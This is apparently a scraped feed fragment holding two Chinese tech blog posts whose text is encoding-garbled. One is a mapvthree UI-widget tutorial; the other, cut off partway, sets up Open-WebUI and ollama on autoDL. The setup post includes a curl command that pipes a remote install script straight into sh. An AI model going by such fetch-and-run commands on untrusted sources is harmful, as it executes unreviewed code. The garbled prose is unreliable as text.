                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä½œä¸ºåˆšæ¥è§¦ mapvthree çš„æ–°æ‰‹ï¼Œä»Šå¤©æˆ‘ä¸“é—¨å­¦ä¹ äº† UI æ§ä»¶æ¨¡å—ã€‚è¿™é‡Œæ•´ç†å‡ºæœ€å¸¸ç”¨çš„æ§ä»¶å’Œå®ç”¨æŠ€å·§ï¼Œå¸®åŠ©å’Œæˆ‘ä¸€æ ·çš„åˆå­¦è€…å¿«é€Ÿä¸Šæ‰‹ã€‚</p>
</blockquote>
<h2 data-id="heading-0">æ§ä»¶ç®¡ç†å…¥å£ï¼šengine.widgets</h2>
<p>mapvthree ä¸­çš„æ§ä»¶ç”± <code>EngineWidgets</code> ç®¡ç†ï¼Œå®ä¾‹åŒ–åå¯ä»¥é€šè¿‡ <code>engine.widgets</code> è®¿é—®ã€‚æ§ä»¶åˆ†ä¸¤ç§å¯ç”¨æ–¹å¼ï¼š</p>
<ol>
<li><strong>åˆå§‹åŒ–æ—¶é…ç½®</strong>ï¼šåœ¨ <code>new Engine()</code> æ—¶ï¼Œé€šè¿‡ <code>widgets</code> å­—æ®µè®¾ç½® <code>enabled</code></li>
<li><strong>è¿è¡Œæ—¶æ§åˆ¶</strong>ï¼šå¼•æ“åˆ›å»ºå®Œæˆåï¼Œç›´æ¥ä¿®æ”¹ <code>engine.widgets.xxx.enabled</code></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> engine = <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">Engine</span>(container, {
    <span class="hljs-attr">map</span>: { <span class="hljs-attr">center</span>: [<span class="hljs-number">106.515</span>, <span class="hljs-number">29.639</span>], <span class="hljs-attr">range</span>: <span class="hljs-number">500</span> },
    <span class="hljs-attr">rendering</span>: {
        <span class="hljs-comment">// å¯¼å‡ºå›¾ç‰‡éœ€è¦å¼€å¯</span>
        <span class="hljs-attr">preserveDrawingBuffer</span>: <span class="hljs-literal">true</span>,
    },
    <span class="hljs-attr">widgets</span>: {
        <span class="hljs-attr">zoom</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },        <span class="hljs-comment">// ç¼©æ”¾æ§ä»¶</span>
        <span class="hljs-attr">fullscreen</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },  <span class="hljs-comment">// å…¨å±æ§ä»¶</span>
        <span class="hljs-attr">geoLocate</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },   <span class="hljs-comment">// å®šä½æ§ä»¶</span>
        <span class="hljs-attr">exportImage</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> }, <span class="hljs-comment">// å¯¼å‡ºå›¾ç‰‡æ§ä»¶</span>
        <span class="hljs-attr">compass</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },     <span class="hljs-comment">// æŒ‡å—é’ˆ</span>
        <span class="hljs-attr">mapInfo</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },     <span class="hljs-comment">// æ˜¾ç¤ºåœ°ç†åæ ‡</span>
    },
});

<span class="hljs-comment">// è¿è¡Œæ—¶å¼€å¯æ¯”ä¾‹å°ºä¸ logo</span>
engine.<span class="hljs-property">widgets</span>.<span class="hljs-property">scale</span>.<span class="hljs-property">enabled</span> = <span class="hljs-literal">true</span>;
engine.<span class="hljs-property">widgets</span>.<span class="hljs-property">logo</span>.<span class="hljs-property">enabled</span> = <span class="hljs-literal">true</span>;
</code></pre>
<blockquote>
<p>å°è´´å£«ï¼š<code>exportImage</code> å¿…é¡»æ­é… <code>rendering.preserveDrawingBuffer = true</code>ï¼Œå¦åˆ™æˆªå›¾ä¼šæ˜¯ç©ºç™½ã€‚</p>
</blockquote>
<h2 data-id="heading-1">å¸¸ç”¨æ§ä»¶ä¸€è§ˆ</h2>













































<table><thead><tr><th>æ§ä»¶</th><th>ä½œç”¨</th><th>ä½¿ç”¨å»ºè®®</th></tr></thead><tbody><tr><td><code>zoom</code></td><td>æ˜¾ç¤ºç¼©æ”¾æŒ‰é’®</td><td>ä¸é¼ æ ‡æ»šè½®é…åˆï¼Œæ˜“ç”¨æ€§æ›´é«˜</td></tr><tr><td><code>compass</code></td><td>æ˜¾ç¤ºæ–¹å‘å’Œå€¾è§’</td><td>é€‚åˆ 3D åœºæ™¯ï¼Œä¾¿äºç”¨æˆ·æ¢å¤é»˜è®¤è§†è§’</td></tr><tr><td><code>fullscreen</code></td><td>å…¨å±åˆ‡æ¢</td><td>é€‚åˆå¤§å±å±•ç¤ºæˆ–éœ€è¦æ²‰æµ¸ä½“éªŒçš„åœºæ™¯</td></tr><tr><td><code>geoLocate</code></td><td>å®šä½æŒ‰é’®</td><td>æ­é…è·å–å®šä½çš„ä¸šåŠ¡é€»è¾‘ä½¿ç”¨</td></tr><tr><td><code>exportImage</code></td><td>å¯¼å‡ºå½“å‰åœºæ™¯ä¸ºå›¾ç‰‡</td><td>éœ€å¼€å¯ <code>preserveDrawingBuffer</code></td></tr><tr><td><code>mapInfo</code></td><td>æ˜¾ç¤ºå½“å‰åœ°ç†åæ ‡</td><td>å¯¹éœ€è¦ç²¾ç¡®å®šä½çš„ä¸šåŠ¡å¾ˆæœ‰å¸®åŠ©</td></tr><tr><td><code>drawer</code></td><td>è‡ªå®šä¹‰æ§ä»¶å®¹å™¨ï¼ˆå¦‚å·¥å…·é¢æ¿ï¼‰</td><td>å¯ä»¥æŒ‚è‡ªå®šä¹‰æŒ‰é’®æˆ–æ“ä½œ</td></tr></tbody></table>
<h2 data-id="heading-2">æ·±å…¥é…ç½®ï¼šmapInfoã€drawer ä¸ accessors</h2>
<p>é™¤äº† <code>enabled</code>ï¼Œéƒ¨åˆ†æ§ä»¶è¿˜æä¾›æ›´ç»†çš„å‚æ•°ï¼š</p>
<ul>
<li><strong>mapInfo</strong>
<ul>
<li><code>template</code>ï¼šå­—ç¬¦ä¸²ç”± <code>C</code>ï¼ˆä¸­å¿ƒç‚¹ï¼‰ã€<code>R</code>ï¼ˆè§†é‡è·ç¦»ï¼‰ã€<code>H</code>ï¼ˆheadingï¼‰ã€<code>P</code>ï¼ˆpitchï¼‰ç­‰å ä½ç¬¦ç»„æˆï¼Œé»˜è®¤ <code>CR</code></li>
<li><code>separator</code>ï¼šå­—æ®µä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œé»˜è®¤ <code>' | '</code></li>
<li>ä¾‹å¦‚ï¼š<code>mapInfo: { enabled: true, template: 'CHP', separator: ', ' }</code></li>
</ul>
</li>
<li><strong>drawer</strong>
<ul>
<li><code>draws</code> æ•°ç»„æè¿°æ¯ä¸ªå·¥å…·é¡¹ï¼š<code>name</code>ã€<code>defaultChecked</code>ã€<code>data</code>ã€<code>onChange</code></li>
<li><code>onChange(checked, data, engine)</code> åœ¨å¼€å…³æ—¶è§¦å‘ï¼Œå¯ç”¨äºæ·»åŠ /ç§»é™¤å¯¹è±¡</li>
</ul>
</li>
<li><strong>è®¿é—®å™¨ï¼ˆaccessorï¼‰</strong>
<ul>
<li>æ¯ä¸ªæ§ä»¶éƒ½æœ‰å¯¹åº”çš„ getterï¼Œä¾‹å¦‚ <code>engine.widgets.zoom</code>ã€<code>engine.widgets.scale</code></li>
<li>è·å–åˆ°çš„æ˜¯æ§ä»¶å®ä¾‹ï¼Œå¯ä»¥ç›´æ¥è¯»å†™å±æ€§ï¼š<code>engine.widgets.mapInfo.template = 'CRH'</code></li>
</ul>
</li>
</ul>
<h2 data-id="heading-3">è‡ªå®šä¹‰ Drawer æ§ä»¶</h2>
<p><code>drawer</code> ç±»ä¼¼ä¸€ä¸ªå·¥å…·æŠ½å±‰ï¼Œå¯ä»¥é…ç½®å¤šä¸ªâ€œå·¥å…·é¡¹â€ã€‚æ¯ä¸ªå·¥å…·é¡¹çš„ <code>onChange</code> å›è°ƒä¼šåœ¨å¼€å…³æ—¶è§¦å‘ï¼Œå¯ç”¨äºæ·»åŠ /ç§»é™¤ç‰©ä½“ç­‰è‡ªå®šä¹‰é€»è¾‘ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> engine = <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">Engine</span>(container, {
    ...,
    <span class="hljs-attr">widgets</span>: {
        <span class="hljs-attr">drawer</span>: {
            <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">draws</span>: [
                {
                    <span class="hljs-attr">name</span>: <span class="hljs-string">'æ·»åŠ ç»¿ç›’å­'</span>,
                    <span class="hljs-attr">data</span>: { <span class="hljs-attr">mesh</span>: <span class="hljs-literal">null</span> },
                    <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">checked, data, engine</span>) =&gt;</span> {
                        <span class="hljs-keyword">if</span> (!data.<span class="hljs-property">mesh</span>) {
                            <span class="hljs-keyword">const</span> position = engine.<span class="hljs-property">map</span>.<span class="hljs-title function_">projectArrayCoordinate</span>([<span class="hljs-number">106.515</span>, <span class="hljs-number">29.639</span>]);
                            <span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>);
                            <span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({<span class="hljs-attr">color</span>: <span class="hljs-number">0x00ff00</span>});
                            <span class="hljs-keyword">const</span> mesh = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(geometry, material);
                            mesh.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(position[<span class="hljs-number">0</span>], position[<span class="hljs-number">1</span>], position[<span class="hljs-number">2</span>]);
                            data.<span class="hljs-property">mesh</span> = mesh;
                        }
                        checked ? engine.<span class="hljs-title function_">add</span>(data.<span class="hljs-property">mesh</span>) : engine.<span class="hljs-title function_">remove</span>(data.<span class="hljs-property">mesh</span>);
                    },
                },
            ],
        },
    },
});
</code></pre>
<h2 data-id="heading-4">æˆªå›¾åŠŸèƒ½ï¼šåˆ«å¿˜äº† preserveDrawingBuffer</h2>
<p><code>exportImage</code> æ§ä»¶å…¶å®æ˜¯ä¸€ä¸ªâ€œå¯¼å‡ºå½“å‰ç”»é¢â€çš„æŒ‰é’®ï¼Œä½†è¦æ­£å¸¸æˆªå›¾å¿…é¡»å¼€å¯ <code>rendering.preserveDrawingBuffer = true</code>ã€‚åœ¨çº¯å¼•æ“åœºæ™¯ä¸‹åªç”¨è®¾ç½®è¿™ä¸€é¡¹ï¼›å¦‚æœå åŠ  BMapGL æˆ– mapboxï¼Œè¿˜éœ€è¦åœ¨å¯¹åº”åœ°å›¾å®ä¾‹åˆå§‹åŒ–æ—¶å¼€å¯åŒåå‚æ•°ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> engine = <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">Engine</span>(container, {
    <span class="hljs-attr">rendering</span>: {
        <span class="hljs-attr">preserveDrawingBuffer</span>: <span class="hljs-literal">true</span>,
    },
    <span class="hljs-attr">widgets</span>: {
        <span class="hljs-attr">exportImage</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },
    },
});
</code></pre>
<h2 data-id="heading-5">ä½¿ç”¨å»ºè®®</h2>
<ul>
<li><strong>æŒ‰éœ€å¯ç”¨</strong>ï¼šæ§ä»¶è¶Šå¤šè¶Šä¸ä¸€å®šå¥½ï¼ŒæŒ‰åœºæ™¯éœ€æ±‚å¯ç”¨å³å¯</li>
<li><strong>ç»Ÿä¸€é£æ ¼</strong>ï¼šè‹¥æœ‰è‡ªå®šä¹‰ UIï¼Œå°½é‡ä¸å†…ç½®æ§ä»¶ä¿æŒè§†è§‰ä¸€è‡´</li>
<li><strong>ä¸ä¸šåŠ¡é€»è¾‘é…åˆ</strong>ï¼šæ§ä»¶åªæ˜¯å…¥å£ï¼Œæ ¸å¿ƒä¸šåŠ¡é€»è¾‘ä»éœ€è‡ªè¡Œå®ç°ï¼ˆå¦‚å®šä½ã€æˆªå›¾ç»“æœä¿å­˜ç­‰ï¼‰</li>
<li><strong>è¿è¡Œæ—¶æ§åˆ¶</strong>ï¼šå¯ä»¥æ ¹æ®åœºæ™¯çŠ¶æ€åŠ¨æ€å¼€å¯/å…³é—­æ§ä»¶ï¼Œä¾‹å¦‚è¿›å…¥æ’­æ”¾æ¨¡å¼æ—¶éšè—æ‰€æœ‰æŒ‰é’®</li>
</ul>
<hr/>
<blockquote>
<p>å­¦ä¹ ç¬”è®°å°±åˆ°è¿™é‡Œå•¦ï¼å†…ç½®æ§ä»¶ç”¨èµ·æ¥å¹¶ä¸å¤æ‚ï¼Œå…³é”®æ˜¯ç†è§£â€œåˆå§‹åŒ–é…ç½® + è¿è¡Œæ—¶æ§åˆ¶â€è¿™ä¸¤ç§æ–¹å¼ï¼Œç„¶åæŒ‰éœ€ç»„åˆå³å¯ã€‚å¸Œæœ›è¿™ä»½ç¬”è®°èƒ½å¸®ä½ å¿«é€ŸæŠŠæ§ä»¶ç”¨å¥½ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[autoDLå®‰è£…Open-WebUi+Ragæœ¬åœ°çŸ¥è¯†åº“é—®ç­”+Function Calling]]></title>    <link>https://juejin.cn/post/7576929700842405897</link>    <guid>https://juejin.cn/post/7576929700842405897</guid>    <pubDate>2025-11-27T06:16:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576929700842405897" data-draft-id="7576978338754379826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="autoDLå®‰è£…Open-WebUi+Ragæœ¬åœ°çŸ¥è¯†åº“é—®ç­”+Function Calling"/> <meta itemprop="keywords" content="åç«¯,ç®—æ³•,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-11-27T06:16:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="16_one"/> <meta itemprop="url" content="https://juejin.cn/user/2802034986197256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            autoDLå®‰è£…Open-WebUi+Ragæœ¬åœ°çŸ¥è¯†åº“é—®ç­”+Function Calling
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2802034986197256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    16_one
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:16:06.000Z" title="Thu Nov 27 2025 06:16:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">åŸºç¡€ç¯å¢ƒæ­å»º</h2>
<ol>
<li>open-webuiå®‰è£…</li>
</ol>

<pre><code class="hljs language-arduino" lang="arduino">pip install open-webui
</code></pre>
<p>2.  ollamaåœ¨çº¿å®‰è£…</p>

<pre><code class="hljs language-arduino" lang="arduino">curl -fsSL https:<span class="hljs-comment">//ollama.com/install.sh | sh</span>
</code></pre>
<p>2.1. å°†æ¨¡å‹ä¸‹è½½åœ°å€æ”¹åˆ°æ•°æ®ç›˜</p>
<pre><code class="hljs language-bash" lang="bash">vim /etc/profile
<span class="hljs-built_in">export</span> OLLAMA_MODELS=/root/autodl-tmp/models
<span class="hljs-built_in">source</span> /etc/profile
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75603b64bf91446681b7e171960fb74d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=z6qo5N2GUCerQhCaWBhNKOyyVQk%3D" alt="image.png" loading="lazy"/>
2.2. å¯åŠ¨ollama</p>
<pre><code class="hljs language-sql" lang="sql">ollama <span class="hljs-keyword">start</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3db9188f6141416c9b980fb2dd4c8146~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=mQ7yDOL3gkaqMz8MtpnM3tbyvCQ%3D" alt="5b549c7e-dbee-4a05-b64b-43065e14c80e.png" loading="lazy"/>
3. å®‰è£…deepseek-r1:14bæ¨¡å‹</p>
<pre><code class="hljs">ollama pull deepseek-r1:14b
</code></pre>
<p>4.  Embeddingæ¨¡å‹ä¸‹è½½</p>

<pre><code class="hljs language-arduino" lang="arduino">ollama pull nomic-embed-text
</code></pre>
<p>5.  æŸ¥çœ‹æ¨¡å‹ä¸‹è½½æƒ…å†µ</p>

<pre><code class="hljs">ollama list
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2197e9452cb8410f886a903fb93a2a92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=lUeO4g2m%2BUm8rAVhZy5Rd9%2FCSXc%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">Open-WebUiè°ƒç”¨</h2>
<blockquote>
<p>é¦–å…ˆéœ€è¦è®¾ç½®ç¦»çº¿ç¯å¢ƒï¼Œé¿å…Open-WebUIå¯åŠ¨æ—¶è‡ªåŠ¨è¿›è¡Œæ¨¡å‹ä¸‹è½½ï¼š</p>
<p>export HF_HUB_OFFLINE=1</p>
</blockquote>
<ol>
<li>Open-WebUiå¯åŠ¨</li>
</ol>

<pre><code class="hljs language-arduino" lang="arduino">open-webui serve
</code></pre>
<p>2.  æœ¬åœ°8080ç«¯å£è®¿é—®</p>
<blockquote>
<p>éœ€è¦å»ºç«‹é“¾æ¥éš§é“ï¼Œautodlå‚è€ƒè¿™é‡Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.autodl.com%2Fdocs%2Fvisdom%2F" target="_blank" title="https://www.autodl.com/docs/visdom/" ref="nofollow noopener noreferrer">www.autodl.com/docs/visdomâ€¦</a></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76b1a94e26e14597a37071d737108c93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=dOinCM%2FqSnmhAkPWqHVV%2Bcr4IDY%3D" alt="image.png" loading="lazy"/></p>
<ol start="3">
<li>Ragæœ¬åœ°çŸ¥è¯†åº“é—®ç­”</li>
</ol>
<blockquote>
<p>æŒ‰ç…§å¦‚ä¸‹æ­¥éª¤æ“ä½œåï¼Œå³å¯ä¸Šä¼ æ–‡æ¡£ï¼Œè¿›è¡ŒåŸºç¡€æœ¬åœ°çŸ¥è¯†åº“é—®ç­”</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cb9dd05b40b475a823eaf1fb833e510~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=XksybYfu5ag%2BoLZjDrKeUavcRh8%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
